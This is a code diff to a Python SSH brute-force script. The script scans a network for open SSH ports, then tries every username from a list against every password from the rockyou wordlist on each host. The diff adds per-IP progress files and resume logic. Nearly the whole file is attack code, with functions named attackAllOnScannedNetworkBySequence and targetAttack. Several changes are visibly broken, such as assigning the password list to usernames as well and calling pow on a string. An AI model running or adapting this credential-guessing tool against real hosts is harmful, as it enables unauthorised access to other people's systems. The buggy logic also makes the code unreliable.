@@ -9,6 +9,13 @@ import datetime
 import SSHScanNetwork
 import SSHFiles
 
+myGlobalIp = SSHScanNetwork.getMyGlobalIp()
+
+splitBy = SSHFiles.detectOS()
+getPathToCurrentDir = SSHFiles.getPathToCurrentDir()
+linesInFile = SSHFiles.getAmountOfLinesInFile(getPathToCurrentDir + "rockyou2.txt")
+#print(linesInFile)
+
 '''
 -------------------------------------------------------TIMING-------------------------------------------------------
 '''
@@ -33,27 +40,15 @@ server = "192.168.1.131"
 
 passwordFile = "rockyou2.txt"
 usernameFile = "usernames.txt"
+IPFolderName = "IPs"
 
 #Reading passwords
-fileName = os.path.join(SSHFiles.getPathToCurrentDir() + passwordFile)
-pws = open(fileName)
-passwords = pws.readlines()
+passwords = usernames = SSHFiles.readTXTFile(getPathToCurrentDir + "rockyou2.txt")
 
 #Reading usernames
-fileName = os.path.join(SSHFiles.getPathToCurrentDir() + usernameFile)
-usr = open(fileName)
-usernames = usr.readlines()
+usernames = SSHFiles.readTXTFile(getPathToCurrentDir + "usernames.txt")
 
 ipAddresses = SSHScanNetwork.getListWithIpsOfOpenSSHPorts()
-print(ipAddresses)
-
-
-#        output = os.popen(command).read()
-#        print(output)
-#        sudo apt install sshpass
-#        if "Welcome to" in output:
-            #Successfully breached
-            #break
 
 '''
 -------------------------------------------------------TIME-------------------------------------------------------
@@ -76,15 +71,17 @@ def formatTime(runtimeSeconds, minutes, hours, days):
 -------------------------------------------------------PROGRAMS-------------------------------------------------------
 '''
 
-def attackAllOnScannedNetworkBySequenceImproved():
+def attackAllOnScannedNetworkBySequence():
     counter = 0
     isError = False
     for ip in ipAddresses:
         if isError:
             break
+        SSHFiles.createTXTFileInSpecifiedDir(ip, SSHFiles.getPathToCurrentDir() + IPFolderName + splitBy)
         for user in usernames:
             if isError:
                 break
+            resumeFromWhere(ip, user)
             removingBreakline = user.split("\n")
             user = removingBreakline[0]
             for pw in passwords:
@@ -92,8 +89,11 @@ def attackAllOnScannedNetworkBySequenceImproved():
                     if isError:
                         break
                     counter += 1
-                    pw = pw[:-1]
+                    checkIfCounterIs143(counter, ip, user)
+                    #pw = pw[:-1]
                     password = str(pw)
+                    passwordList = password.split("\n")
+                    password = passwordList[0]
                     print("Attacking: " + ip + " with user: " + str(user) + " Trying: with password: " + password + " Attempt: " + str(counter))  
                     commandLiteral = mode + " " + password + " " + mode2 + " " + str(user) + "@" + ip
                     print(commandLiteral)
@@ -111,11 +111,11 @@ def attackAllOnScannedNetworkBySequenceImproved():
         if isError:
             break
 
-
 def targetAttack(ipAddress, usernameOrpassword, howManyInstances):
     # EG VAR HER SIST
     #ipAddress, usernameOrpassword, howManyInstances
     #Used when you have additional information about target
+    #usernameOrpassword is a list with '-u username' AND OR '-p password' 
 
     #username = -u 'username'
     #password = -p 'password'
@@ -142,7 +142,41 @@ def targetAttack(ipAddress, usernameOrpassword, howManyInstances):
 #def readPreviouslyAttacked(listWithIPs):
 
 '''
+-------------------------------------------------------HELPERS-------------------------------------------------------
+'''
+
+def checkIfCounterIs143(counter, ip, user):
+    if (round(linesInFile / 100000) % counter) == 0:
+        #For every 143 lines it saves progress
+        writeProgress(ip, user, 1)
+
+def resumeFromWhere(ip, username):
+    filename = SSHFiles.getPathToCurrentDir() + IPFolderName + splitBy + ip
+    if SSHFiles.checkIfFileExist(filename):
+        #Checks if current ip has a file named after itsself if it has returns true
+        contentOfFile = SSHFiles.readTXTFile(filename)
+        index = 0
+        for i in range(SSHFiles.getAmountOfLinesInFile(filename)):
+            splitList = contentOfFile[i].split(" ")
+            if splitList[1] == "DONE":
+                print("Done testing passwords for this user. Proceeding to next user...")
+                break
+            index = index + 143 * pow(10, splitList[1])
+        #Returns the index where it should start to read for new passwords
+        return index
+
+def writeProgress(ip, username, value):
+    #Default value is 1
+    #See info.txt in IPs
+    print("Adding progress to file...")
+    SSHFiles.addTextToSpecifiedFile(ip + ".txt", SSHFiles.getPathToCurrentDir() + IPFolderName + splitBy, username + " " + value)
+
+'''
 -------------------------------------------------------MAIN-------------------------------------------------------
 '''
 
-targetAttack()
+
+#targetAttack()
+#attackAllOnScannedNetworkBySequence()
+#writeProgress("192.168.1.20", "test")
+print(resumeFromWhere("192.168.1.20.txt", "isak"))
